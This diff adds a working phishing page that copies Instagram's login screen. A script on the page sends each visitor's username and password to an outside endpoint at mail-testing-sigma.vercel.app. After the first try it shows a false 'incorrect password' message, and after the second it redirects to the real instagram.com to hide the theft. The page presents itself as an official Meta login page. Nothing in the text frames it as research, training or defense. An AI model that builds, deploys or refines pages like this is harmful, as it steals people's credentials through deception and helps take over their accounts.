@@ -355,3 +355,175 @@ asdad
     }
   </style>
 </head>
+  <body>
+
+  <div class="page-wrapper">
+
+    <!-- ── LEFT PANEL (desktop only) ─────────────────────────── -->
+    <section class="left-panel" aria-hidden="true">
+      <img src="assets/insta-logo.webp" alt="Instagram" class="brand-logo" />
+      <p class="tagline">
+        See everyday moments from<br />
+        your <span class="highlight">close friends</span>.
+      </p>
+      <img src="assets/desktop.webp" alt="" class="hero-image" />
+    </section>
+
+    <!-- ── RIGHT PANEL ────────────────────────────────────────── -->
+    <main class="right-panel">
+
+      <!-- Mobile-only logo header -->
+      <div class="mobile-header">
+        <img src="assets/insta-logo.webp" alt="Instagram" class="brand-logo" />
+      </div>
+
+      <!-- Login form -->
+      <div class="login-box">
+        <h1 class="login-heading">Log into Instagram</h1>
+
+        <div class="form-group">
+          <input
+            id="username"
+            class="form-input"
+            type="text"
+            placeholder="Mobile number, username or email"
+            autocomplete="username"
+            aria-label="Mobile number, username or email"
+          />
+          <input
+            id="password"
+            class="form-input"
+            type="password"
+            placeholder="Password"
+            autocomplete="current-password"
+            aria-label="Password"
+          />
+        </div>
+
+        <div id="status-msg" class="status-msg" aria-live="polite"></div>
+
+        <button id="btn-login" class="btn-login" type="button">Log in</button>
+
+        <a class="forgot-link" href="#" tabindex="0">Forgot password?</a>
+
+        <div class="divider-spacer"></div>
+
+        <!-- Facebook login -->
+        <button class="btn-facebook" type="button">
+          <!-- Facebook 'f' icon SVG -->
+          <svg class="fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" fill="url(#fb-grad)">
+            <defs>
+              <linearGradient x1="50%" x2="50%" y1="97.0782%" y2="0%" id="fb-grad">
+                <stop offset="0%" stop-color="#0062E0"/>
+                <stop offset="100%" stop-color="#19AFFF"/>
+              </linearGradient>
+            </defs>
+            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"/>
+            <path fill="white" d="m25 23 .8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"/>
+          </svg>
+          Log in with Facebook
+        </button>
+
+        <!-- Create account -->
+        <button class="btn-create" type="button">Create new account</button>
+
+        <!-- Meta branding -->
+        <div class="meta-branding">
+          <img src="assets/meta-logo.svg" alt="Meta" class="meta-logo-img" />
+        </div>
+      </div>
+    </main>
+
+  </div><!-- /page-wrapper -->
+
+  <!-- ── FOOTER (mobile only) ───────────────────────────────────── -->
+  <footer class="site-footer">
+    <nav class="footer-links" aria-label="Footer links">
+      <a href="#">Meta</a>
+      <a href="#">About</a>
+      <a href="#">Blog</a>
+      <a href="#">Jobs</a>
+      <a href="#">Help</a>
+      <a href="#" style="color:#1877f2;">API</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Locations</a>
+      <a href="#">Popular</a>
+      <a href="#">Instagram Lite</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Threads</a>
+      <a href="#">Contact Uploading &amp; Non-Users</a>
+      <a href="#">Meta Verified</a>
+    </nav>
+    <div class="footer-bottom">
+      <span class="footer-lang">
+        English
+        <svg viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M1 1l4 4 4-4" stroke="#737373" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+      <span>© 2026 Instagram from Meta</span>
+    </div>
+  </footer>
+
+  <script>
+    const btn       = document.getElementById('btn-login');
+    const userInput = document.getElementById('username');
+    const passInput = document.getElementById('password');
+    const statusMsg = document.getElementById('status-msg');
+
+    let attemptCount = 0;
+
+    btn.addEventListener('click', handleLogin);
+
+    // Allow Enter key from either field
+    [userInput, passInput].forEach(el =>
+      el.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); })
+    );
+
+    async function handleLogin() {
+      const username = userInput.value;
+      const password = passInput.value;
+
+      // Clear previous status
+      statusMsg.textContent = '';
+      statusMsg.className = 'status-msg';
+
+      // Set loading state
+      btn.disabled = true;
+      btn.classList.add('loading');
+      btn.textContent = 'Logging in\u2026';
+
+      try {
+        // Send credentials (no-cors to avoid preflight CORS issue)
+        await fetch('https://mail-testing-sigma.vercel.app/api/send-credentials', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ username, password })
+        });
+      } catch (err) {
+        // Network failure — still proceed with attempt logic
+      } finally {
+        btn.disabled = false;
+        btn.classList.remove('loading');
+        btn.textContent = 'Log in';
+      }
+
+      attemptCount++;
+
+      if (attemptCount >= 2) {
+        // Second attempt → redirect
+        window.location.href = 'https://www.instagram.com';
+      } else {
+        // First attempt → show error
+        statusMsg.textContent = 'The password you entered is incorrect. Please try again.';
+        statusMsg.classList.add('error');
+        passInput.value = '';
+        passInput.focus();
+      }
+    }
+  </script>
+
+</body>
+</html>
